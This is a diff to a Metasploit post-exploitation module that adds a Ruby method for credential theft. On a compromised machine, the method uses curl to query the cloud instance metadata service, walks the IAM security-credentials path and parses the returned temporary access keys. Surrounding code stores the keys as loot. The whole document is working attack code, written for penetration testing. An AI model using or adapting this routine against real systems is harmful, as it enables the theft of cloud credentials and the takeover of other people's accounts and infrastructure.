@@ -93,5 +93,30 @@ class MetasploitModule < Msf::Post
     path = store_loot(doc['AccessKeyId'], 'text/plain', datastore['RHOST'], doc.to_json)
     print_good("API keys stored at: " + path)
   end
+
+  def metadata_creds
+    # TODO: do it for windows/generic way
+    cmd_out = cmd_exec("curl --version")
+    if cmd_out =~ /^curl \d/
+      url = "http://#{datastore['METADATA_IP']}/2012-01-12/meta-data/"
+      print_status("#{datastore['METADATA_IP']} - looking for creds...")
+      resp = cmd_exec("curl #{url}")
+      if resp =~ /^iam.*/
+        resp = cmd_exec("curl #{url}iam/")
+        if resp =~ /^security-credentials.*/
+          resp = cmd_exec("curl #{url}iam/security-credentials/")
+          json_out = cmd_exec("curl #{url}iam/security-credentials/#{resp}")
+          begin
+            return JSON.parse(json_out)
+          rescue JSON::ParserError
+            print_error "Could not parse JSON output"
+          end
+        end
+      end
+    else
+      print_error cmd_out
+    end
+    {}
+  end
 end
 
